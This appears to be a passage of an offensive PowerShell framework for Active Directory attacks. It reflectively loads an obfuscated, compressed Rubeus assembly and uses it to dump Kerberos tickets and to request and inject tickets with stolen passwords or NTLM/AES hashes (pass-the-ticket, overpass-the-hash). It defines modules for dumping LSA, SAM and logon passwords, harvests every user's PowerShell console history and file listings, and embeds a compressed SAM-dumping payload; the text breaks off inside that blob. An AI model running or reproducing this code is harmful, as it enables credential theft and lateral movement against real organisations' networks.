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"))
    $decompressed = New-Object IO.Compression.GzipStream($a,[IO.Compression.CoMPressionMode]::DEComPress)
    $output = New-Object System.IO.MemoryStream
    $decompressed.CopyTo( $output )
    [byte[]] $byteOutArray = $output.ToArray()
    $RAS = [System.Reflection.Assembly]::Load($byteOutArray)

    $vars = New-Object System.Collections.Generic.List[System.Object]

    foreach ($args in $Command.Split(" "))
    {
        $vars.Add($args)
    }

    $passed = [string[]]$vars.ToArray()

    $BindingFlags= [Reflection.BindingFlags] "NonPublic,Static"

    $OldConsoleOut = [Console]::Out
    $StringWriter = New-Object IO.StringWriter
    [Console]::SetOut($StringWriter)
    $PrivateMethod = [Rubeus.Program].GetMethod('Main')

    if($PrivateMethod){
      $PrivateMethod.Invoke($Null,@(,$passed))
      }
    else{
      $PrivateMethod = [Rubeus.Program].GetMethod('Main')
      $PrivateMethod.Invoke($Null,@(,$passed))
      }
     [Console]::SetOut($OldConsoleOut)
    $Results = $StringWriter.ToString()
    $Results
    }
}

################################################################################################################
##################################### Ticket logic for authentication ##########################################
################################################################################################################
# Set the userDomain when impersonating a user in one domain for access to an alternate domain
if ($UserDomain -ne ""){}


# Check if the current user is an administrator
$CheckAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

# If CurrentUser is not set to $True, use Rubeus to store the current user's ticket
if (!$CurrentUser) {
    # If the method is not RDP
    if ($Method -ne "RDP") {
        try {
            $BaseTicket = Invoke-Rubeus "tgtdeleg /nowrap" | Out-String
            $OriginalUserTicket = ($BaseTicket | Select-String -Pattern 'doI.*' | Select-Object -First 1).Matches.Value.Trim()
        }
        Catch {
            try {
                Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
                Write-Host "Current user ticket retrieval failed. Trying alternate methods..."
                Start-Sleep -Seconds 2

                if (!$CheckAdmin) {
                    $BaseTicket = Invoke-Rubeus "dump /service:krbtgt /nowrap" | Out-String
                    $OriginalUserTicket = ($BaseTicket | Select-String -Pattern 'doI.*' | Select-Object -First 1).Matches.Value.Trim()
                    if ($OriginalUserTicket -notlike "doI*") {
                        Write-Host "[-] " -NoNewline -ForegroundColor "Red"
                        Write-Host "Unable to retrieve any Kerberos tickets"
                        return
                    }

                    Write-Host "[+] " -ForegroundColor "Green" -NoNewline
                    Write-Host "SUCCESS!"
                }
                elseif ($CheckAdmin) {
                    $BaseTicket = Invoke-Rubeus "dump /service:krbtgt /user:$env:username /nowrap" | Out-String
                    $OriginalUserTicket = ($BaseTicket | Select-String -Pattern 'doI.*' | Select-Object -First 1).Matches.Value.Trim()
                    if ($OriginalUserTicket -notlike "doI*") {
                        Write-Host "[-] " -NoNewline
                        Write-Host "Unable to retrieve any Kerberos tickets" -ForegroundColor "Red"
                        return
                    }

                    Write-Host "[+] " -ForegroundColor "Green" -NoNewline
                    Write-Host "SUCCESS!"
                }
            }
            Catch {
                Write-Host "[-] " -ForegroundColor "Red" -NoNewline
                Write-Host "Unable to retrieve any Kerberos tickets"
                return
            }
        }

        # Check if Password or Hash has been provided
         if ($Ticket -ne ""){ 
            if ($Ticket -and (Test-Path -Path $Ticket -PathType Leaf)) {
            $Ticket = Get-Content -Path $Ticket -Raw}


            $ProvidedTicket = Invoke-Rubeus -Command "describe /ticket:$Ticket"

            # Check if an error has occurred
            if ($ProvidedTicket -like "*/ticket:X*") {
                Write-Host "[-] " -ForegroundColor "Red" -NoNewline
                Write-Host "Invalid ticket provided"
                return
            }

            # Use regular expression to extract the Username
            $TicketUsername = [regex]::Match($ProvidedTicket, "UserName\s+:  (.+)$", [System.Text.RegularExpressions.RegexOptions]::Multiline).Groups[1].Value
            $TicketRealm = [regex]::Match($ProvidedTicket, "UserRealm\s+:  (.+)$", [System.Text.RegularExpressions.RegexOptions]::Multiline).Groups[1].Value
            $TicketExpiry = [regex]::Match($ProvidedTicket, "EndTime\s+:  (.+)$", [System.Text.RegularExpressions.RegexOptions]::Multiline).Groups[1].Value
            $TicketType = [regex]::Match($ProvidedTicket, "ServiceName\s+:  (.+)$", [System.Text.RegularExpressions.RegexOptions]::Multiline).Groups[1].Value

            # Display the extracted information
            Write-Host
            Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
            Write-Host "Supplied Ticket Details"
            
            if ($TicketType -like "krbtgt/*") { Write-Host "    - Type     : TGT" }
            if ($TicketType -notlike "krbtgt/*") { Write-Host "    - Type     : TGS" }
            
            Write-Host "    - UserName : $TicketUsername"
            Write-Host "    - Realm    : $TicketRealm"
            Write-Host "    - Expires  : $TicketExpiry"
            Write-Host
            
            # Attempt to inject the ticket into the current session
            $InjectTicket = Invoke-Rubeus -Command "ptt /ticket:$Ticket"
            if ($InjectTicket -like "*Error 1398*") {

                Write-Host "[-] " -ForegroundColor "Red" -NoNewline
                Write-host "Ticket expired"
                    klist purge | Out-Null
                    Invoke-Rubeus "ptt /ticket:$OriginalUserTicket" | Out-Null
                        return
            }
    }
       elseif ($Password -ne "") {
            klist purge | Out-Null
            
            if ($UserDomain -ne ""){$AskPassword = Invoke-Rubeus -Command "asktgt /user:$Username /domain:$UserDomain /password:$Password /opsec /force /ptt"}
            elseif ($UserDomain -eq ""){$AskPassword = Invoke-Rubeus -Command "asktgt /user:$Username /domain:$Domain /password:$Password /opsec /force /ptt"}
            
        if ($AskPassword -like "*KDC_ERR_PREAUTH_FAILED*"){
            Write-Host "[-] " -ForegroundColor "Red" -NoNewline
            Write-Host "Incorrect password or username"
            klist purge | Out-Null
            Invoke-Rubeus "ptt /ticket:$OriginalUserTicket" | Out-Null
            return
        }

        if ($AskPassword -like "*Unhandled Rubeus exception:*"){
            Write-Host "[-] " -ForegroundColor "Red" -NoNewline
            Write-Host "Incorrect password or username"
            klist purge | Out-Null
            Invoke-Rubeus "ptt /ticket:$OriginalUserTicket" | Out-Null
            return
        }

        }
       elseif ($Hash -ne "") {
        if ($Hash.Length -eq 32) {
        klist purge | Out-Null
        
        if ($UserDomain -ne ""){$AskRC4 = Invoke-Rubeus -Command "asktgt /user:$Username /domain:$UserDomain /rc4:$Hash /opsec /force /ptt"}
        if ($UserDomain -eq ""){$AskRC4 = Invoke-Rubeus -Command "asktgt /user:$Username /domain:$Domain /rc4:$Hash /opsec /force /ptt"}
        
        if ($AskRC4 -like "*KDC_ERR_PREAUTH_FAILED*"){
            Write-Host "[-] " -ForegroundColor "Red" -NoNewline
            Write-Host "Incorrect hash or username"
            klist purge | Out-Null
            Invoke-Rubeus "ptt /ticket:$OriginalUserTicket" | Out-Null
            return
        }

        if ($AskRC4 -like "*Unhandled Rubeus exception:*"){
            Write-Host "[-] " -ForegroundColor "Red" -NoNewline
            Write-Host "Incorrect hash or username"
            klist purge | Out-Null
            Invoke-Rubeus "ptt /ticket:$OriginalUserTicket" | Out-Null
            return
        }
    }
       elseif ($Hash.Length -eq 64) {
        klist purge | Out-Null

        if ($UserDomain -ne ""){$Ask256 = Invoke-Rubeus -Command "asktgt /user:$Username /domain:$UseDomain /aes256:$Hash /opsec /force /ptt"}
        if ($UserDomain -eq ""){$Ask256 = Invoke-Rubeus -Command "asktgt /user:$Username /domain:$Domain /aes256:$Hash /opsec /force /ptt"}

        if ($Ask256 -like "*KDC_ERR_PREAUTH_FAILED*"){
            Write-Host "[-] " -ForegroundColor "Red" -NoNewline
            Write-Host "Incorrect hash or username"
            klist purge | Out-Null
            Invoke-Rubeus "ptt /ticket:$OriginalUserTicket" | Out-Null
            return
        }

        if ($Ask256 -like "*Unhandled Rubeus exception:*"){
            Write-Host "[-] " -ForegroundColor "Red" -NoNewline
            Write-Host "Incorrect hash or username"
            klist purge | Out-Null
            Invoke-Rubeus "ptt /ticket:$OriginalUserTicket" | Out-Null
            return
        }
    }
       else {
        Write-Host "[-] " -ForegroundColor "Red" -NoNewline
        Write-Host "Supply either a 32-character RC4/NT hash or a 64-character AES256 hash"
        Write-Host 
        Write-Host
        return

	        }
        }
    }
}

################################################################################################################
################################## Information based on selected module ########################################
################################################################################################################

if ($Method -eq "SessionHunter"){
    Write-Host "- " -ForegroundColor "Yellow" -NoNewline
    Write-Host "Searching for systems where privileged users' credentials might be in running memory"
    Write-Host "- " -ForegroundColor "Yellow" -NoNewline
    Write-Host "Filtering by those for which we have admin rights"
    Write-Host
    Start-Sleep -Seconds 3
}

$moduleMessages = @{
    "KerbDump"         = "Tickets will be written to $KerbDump"
    "Tickets"          = "Tickets will be written to $MimiTickets"
    "LSA"              = "LSA output will be written to $LSA"
    "ekeys"            = "eKeys output will be written to $ekeys"
    "SAM"              = "SAM output will be written to $SAM"
    "LogonPasswords"   = "LogonPasswords output will be written to $LogonPasswords"
    "ConsoleHistory"   = "Console History output will be written to $ConsoleHistory"
    "Files"            = "File output will be written to $UserFiles"
}

if ($moduleMessages.ContainsKey($Module)) {
    Write-Host "- " -ForegroundColor "Yellow" -NoNewline
    Write-Host $moduleMessages[$Module]
    
    if (!$ShowOutput){
        Write-Host "- " -ForegroundColor "Yellow" -NoNewline
        Write-Host "Use -ShowOutput to display results in the console"
        ""
    }
}
elseif ($Method -eq "GenRelayList"){
    Write-Host "- " -ForegroundColor "Yellow" -NoNewline
    Write-Host "SMB Signing output will be written to $SMB"
}


################################################################################################################
######################################## Local scripts and modules #############################################
################################################################################################################

$ConsoleHostHistory = @'
Write-Output ""
$usersFolderPath = "C:\Users"
$users = Get-ChildItem -Path $usersFolderPath -Directory

$foundHistoryFile = $false

foreach ($User in $Users) {
    $historyFilePath = Join-Path -Path $User.FullName -ChildPath "AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"

    if (Test-Path -Path $historyFilePath -ErrorAction "SilentlyContinue") {
        $foundHistoryFile = $true

        $historyContent = Get-Content -Path $historyFilePath -Raw
        $historyLines = $historyContent -split "`n"
        Write-output ""
        Write-output "-----[$User]-----"
        $historyLines | Where-Object { $_ -match '\S' } | ForEach-Object { Write-output $_.Trim() }
    }
}

if (-not $foundHistoryFile) {
    Write-Output "No Results"
}

'@



$Files = @'
$usersFolderPath = "C:\Users"
$users = Get-ChildItem -Path $usersFolderPath -Directory

$uninterestingFiles = @("Thumbs.db", "desktop.ini", "desktop.lnk", "Icon?", "Icon\r", "Firefox.lnk", "Microsoft Edge.lnk")
$excludedStartsWith = @("ntuser.dat", "ntuser.ini", "ntuser.pol")

foreach ($user in $users) {
    $userDownloads = Join-Path -Path $user.FullName -ChildPath "Downloads"
    $userDocuments = Join-Path -Path $user.FullName -ChildPath "Documents"
    $userDesktop = Join-Path -Path $user.FullName -ChildPath "Desktop"
    $userHome = $user.FullName

    $downloadsFiles = Get-ChildItem -Path $userDownloads -File -Force -ErrorAction SilentlyContinue
    $documentsFiles = Get-ChildItem -Path $userDocuments -File -Force -ErrorAction SilentlyContinue
    $desktopFiles = Get-ChildItem -Path $userDesktop -File -Force -ErrorAction SilentlyContinue
    $homeFiles = Get-ChildItem -Path $userHome -File -Force -ErrorAction SilentlyContinue

    $downloadsFiles = $downloadsFiles | Where-Object { $uninterestingFiles -notcontains $_.Name -and $excludedStartsWith -notcontains $_.Name -and $_.Name -notlike "ntuser.dat*" -and $_.Extension -ne ".tmp" }
    $documentsFiles = $documentsFiles | Where-Object { $uninterestingFiles -notcontains $_.Name -and $excludedStartsWith -notcontains $_.Name -and $_.Name -notlike "ntuser.dat*" -and $_.Extension -ne ".tmp" }
    $desktopFiles = $desktopFiles | Where-Object { $uninterestingFiles -notcontains $_.Name -and $excludedStartsWith -notcontains $_.Name -and $_.Name -notlike "ntuser.dat*" -and $_.Extension -ne ".tmp" }
    $homeFiles = $homeFiles | Where-Object { $uninterestingFiles -notcontains $_.Name -and $excludedStartsWith -notcontains $_.Name -and $_.Name -notlike "ntuser.dat*" -and $_.Extension -ne ".tmp" }

    $hasFiles = $downloadsFiles.Count -gt 0 -or $documentsFiles.Count -gt 0 -or $desktopFiles.Count -gt 0 -or $homeFiles.Count -gt 0

    if ($hasFiles) {
        Write-Host ""
        Write-Host "----------------------------------------------------------------------------------------------"
        Write-Host ("[User] $user")

        if ($downloadsFiles.Count -gt 0) {
        ""
            Write-Host ("[Downloads]")
            $downloadsFiles | Sort-Object Name | ForEach-Object {
                $fileSize = if ($_.Length -ge 1MB) {
                    "{0:N2} MB" -f ($_.Length / 1MB)
                } else {
                    "{0:N2} KB" -f ($_.Length / 1KB)
                }
                Write-Host ("- $($_.Name) ($fileSize)")
            }
        }

        if ($documentsFiles.Count -gt 0) {
        ""
            Write-Host ("[Documents]")
            $documentsFiles | Sort-Object Name | ForEach-Object {
                $fileSize = if ($_.Length -ge 1MB) {
                    "{0:N2} MB" -f ($_.Length / 1MB)
                } else {
                    "{0:N2} KB" -f ($_.Length / 1KB)
                }
                Write-Host ("- $($_.Name) ($fileSize)")
            }
        }

        if ($desktopFiles.Count -gt 0) {
        ""
            Write-Host ("[Desktop]")
            $desktopFiles | Sort-Object Name | ForEach-Object {
                $fileSize = if ($_.Length -ge 1MB) {
                    "{0:N2} MB" -f ($_.Length / 1MB)
                } else {
                    "{0:N2} KB" -f ($_.Length / 1KB)
                }
                Write-Host ("- $($_.Name) ($fileSize)")
            }
        }

        if ($homeFiles.Count -gt 0) {
        ""
            Write-Host ("[Home]")
            $homeFiles | Sort-Object Name | ForEach-Object {
                $fileSize = if ($_.Length -ge 1MB) {
                    "{0:N2} MB" -f ($_.Length / 1MB)
                } else {
                    "{0:N2} KB" -f ($_.Length / 1KB)
                }
                Write-Host ("- $($_.Name) ($fileSize)")
            }
        }
        Write-Host "----------------------------------------------------------------------------------------------"
    }
}
'@





$LocalSAM = @'
Write-Output "" ; function DumpSAM{$gz="H4sIAAAAAAAEAL1Ze3ObSBL/f6v2O3AcSSAGiqdApqiLLNmObu3YGznZupNZLxIjiwiBwsOWoui7X89DWLJlJ5u4zumfgJnunp5HPyCjKh2WcZZynWo667VOl8Jhnmd5izSe52iEcpQOEedzfC9OUFomi3aWlnFaIf7XX8p8sXy57N9kcRT04+msWBTqbZyaRrBaDcNyOF62oki5WMwQR347aBSnMRmPr4o4veZ6i6JEU2/zQX1fwQBTpHbTEuXZrI
fym3iICi8Np6iYhWANHWo5qwZJPOSGSVgUHBl32e8kSXc6y/JS/IufoDxFiWmoUZL8xcs9VJ6ERUkm6Jd5haSAaSjKsIQLmsOAKTfIsoRrJ1mB3oZplCARDDkvc25MHyXvOQZhOs9mCJY5g+kVYhWnJTejD60h/pWJKYNuOkZ5XNLh5Q2ubnTPmDC6CWfxj814w5SLbILS9bRZGxudGNlBRZyjiBmZVeV6OkRw5zL9jGWdagY9YYmI+sN5vSGH87iA
s3hN2qlp0e22cYw1mRGeVlnm8aAqUUG5wTyUF1ka4jN5gm5QQtsJMz6xm5Objd+hW9LzjHO7swCdZNfXKDpLPxQor6f43OO9h0nm5UXWQ8lIlLzVil/9+stoHQW6rd6y357C9pUHcRrB0oqgLMzDqdg/xxcEmsRT2OCwzPKFL+Dh5POsIE7ta1LQL4Z5PCsHSTacBAI7O/KGcM2sA3M2+ISGZT8IhFZ+XU0hvpzAjkqeEPrH5z1OeQdCHA+unWTXWc
p/BauBn1OO4rwoOZ1TDuczMAaGgVUsF1w38uKRKAoDfzsc7e9vOpo2tzRNprb3YaGBQQgliVPQZ65PFx4k/gvBR1oKQ7//SEBST8O8GIcJ8B7TLfgDD0b2QZRWQuRvK8OmKWlWck/YRj1PGMjaXDuU+xCAAyGSfsqM0fea8cDNhAibYWjkT97WQnrwj86sHP2UlTiTPGbXYy7yk0O+5NbHk3uzefpWkKPCJHncnm0X+hkTVqt7ORTy63T+DCn0Alz+
7yZVMvY3c+q3Yo/cHoc5tPrsqraqMnskIOFI+x5d4+P/G1psxHV4kguI1GB+UQ3wE2atkrMZnnhBnopwyiL9ZoweT96jokrKvxkxf8Dq3yuUL7rpKAPzasMnYGqPGH5QxUmEcOJp46WUwUeIZDIbDmgLfQJzYSvYJBhDj8y52GwanIZz2nwCme5eB9F3r/1jmFTogQrSioPqDi2k7357Dw0rKD0WsNQkrmf5XUYd0QMN3egCjtbzJCm2uqT82lxZuH
+QrY7fnZy/XR63uxz/9reT032oXy8xOtk0jNPiEkqADI79JY4WBf/1X0vhSj3vtcewMySxKFPsYBz/Z19Tmi3lKFi6K4FffX2xFELkbzN7wo0vgg8rXfCmOt98x7iXoItnmeyjpH70ICD/TUVr8SNJPfKE+dBXPmVxKr5c8v/u8DLfm6BbHa7HB8fw2wnLkMdTyKodgX8rwuBQtuF92tylod4Anf/pXRyeXrarHOr/Epf8eZbAHl6y28uTIrwUrnic
AQB6k2WBrMIBEf1gQPTKcZ7dcv12BqcohYFPswglKmWZDxFx/0BAKyGZ+VCMKWekfuBwuFO3/U7XDMvrw2kCm7745Gnn9LfcGMyXQfV6Ll/I7OhDWiXJc9xulxf/j7XakVrIzGsXw5vmwbRVSGlkDXFmgpZpZPv9dQBQ2/kC3P86D2fjhXrasUFJO0eQk8EU4fNjjC1UbDOq2MzHuNvxDN50MAcWOmhj/vMwwnXoYyKsm8m8g5XAQjCtXvwF+brhes
LkMdnOYW/LuMn3G3fYPsD8P2BcBW55EGOXwlUEwkfhIiNFqCjc4APXlva0eRvmDq/bT7PqGhhdQZDBSdzvEy84TIcZHhN4P6Qx3CMVDg/bV5CC8WWsWaotGT6mvuWuLRlMfFe2ZUs2ZF2Xm7JuyqasyQ1Zl3VosmRdk3VbdiDs9Jm1RNnBAhaWF0SIWX3h6rURSHf3e3og8bLekFZecQtWjGHQPgzaDqSlNjdd8Ix0eAV1F+RUXxhBl+uqqjZvOoG3
0XUV39Beh/S693qJ8GDiCWtFn1W63x00JDsFZeQ2u7ytXFIv8jAtRlk+PcJ14QF+sdmUgXWASdBBsY/5MA0R1nbPsCRVZXewjtqRFNxxEbMZo1vzmVssxF46yKb6R2awFpE3x3jCesxBbV/BSbJ2LLdGFnS0Y0EhMqg47sCL9NuwgJ0jG0D4nVGw9+AktnrtbhefQ3wgCpH/x5t/Ci/+fPlalD7f4vT3oXt23voyH94M0unvG3+S+PrNyxd/aby0B5
v4bb2abpiW3XDc5tN3WKNUn4l8aHEbU+TuTXfH1tY7u2Njdy8QVbcnmtiFZO1RRwnRnaOw+ztHkb69Au8uzlu93h9n7ztsjrXt9SzxE7dl7ypCoxCK5uVGSj3vsRulrlHeLD+sY00ddbz33Y5P0iyvzXGl4727ODn1eVPvNNpHh1pHb7QOm6Z+4Jhtu9lxDrW25jbbGg/vPsLkCor8K91niyKT648tjceUGT5TQ9X9uDK8+bqPVZbZFTkVzNp1p7Gj
0/AEsqa6D7nhgZcypfL65tvO6UpMofGEQmOt0PiWQrdWuCOvrFMEncAeG1dScjRL8OvhK+WV/OqV92xHhAxA3oDreh6OKP7mIEygLMp9IQIPhQf/jQiRxbBtSX4Dc35t2DjcfvI1jzbjWveTLwqf9oQCNjLYEyb4Ir0ARo82yfjyKfDpRaaNMLIQ+2tFopCr8PJzXY4VXcIqY1AZ7+lMzd0A8YbmeJfmGKJBCezkdo92MJEcj+vTizKYZznuLQM4cP
nmOtwdLNAicUswNIuiq1mIKwxYDsi6cMQNyMeW7MA/2FeclzGZhCxCDUJNTIZOyCBkE2oQcjGZOiGDkE3IIeRisnRCBiGLkEOoicnWCBmEbEINQk1MDZ2QQcgi5BBqYnI0QiYhi1CDUBOTqxMyCFmEHEIupqZOyCRkEXIIuZh0TWMwGSwGh6FJgQsXAoPBZnAYXApDZzAYLAaHwaUwdQaTwWJwGFwKS2MwGWyGBoNLYesMBoPN4DC4FLDKFAaDxeAw
uBSOzmAyWAwNhiYFrDyFwWAzNBhcCtgDCpPBYmgwNAkM2AsKk8FmaDC4FLrOYDJYDA6DS2FoDCaDxeAwNClMjcFksBgaDE0KOOEUBoPF4DC4FLAXFCaDhQHxSAO/xJc9fxCXxTgelRw4txYoOmkU61aRNg/CNOLw51OJa0jKAML5ppweKIa0Q1C/EzQlzn4oaASKuUvQuBN0JM56KGgGirVL0LwTPJI486GgFSj2LkGrFtRB0HgoaAdKY5egXQuaIK
